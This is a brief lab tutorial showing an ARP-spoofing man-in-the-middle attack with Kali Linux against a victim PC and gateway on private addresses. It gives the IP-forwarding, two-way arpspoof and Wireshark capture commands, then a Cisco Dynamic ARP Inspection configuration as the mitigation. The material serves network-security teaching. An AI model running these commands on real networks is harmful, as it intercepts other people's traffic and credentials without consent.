Man-in-the-Middle (MITM) Attack

Intercept network traffic between a victim and the default gateway using ARP Spoofing.


Kali Linux
(Attacker)

Victim PC
(10.0.0.10)

Gateway
(10.0.0.1)

1
Enable IP Forwarding

Ensure Kali Linux forwards packets so the victim's internet doesn't break during the attack.

echo 1 > /proc/sys/net/ipv4/ip_forward

2
ARP Spoof the Victim

Tell the victim that Kali Linux is the default gateway.

arpspoof -i eth0 -t 10.0.0.10 10.0.0.1

3
ARP Spoof the Gateway

Tell the gateway that Kali Linux is the victim PC.

arpspoof -i eth0 -t 10.0.0.1 10.0.0.10

4
Capture Traffic (Wireshark)

Open Wireshark on Kali Linux. You will now see all HTTP, DNS, and plaintext traffic from the victim flowing through your interface.

wireshark &
🛡️ Mitigation (Cisco Switch): Prevent ARP spoofing by enabling Dynamic ARP Inspection (DAI) on access ports. 
configure terminal
ip arp inspection vlan 10
interface GigabitEthernet0/1
 ip arp inspection limit rate 15 burst interval 1
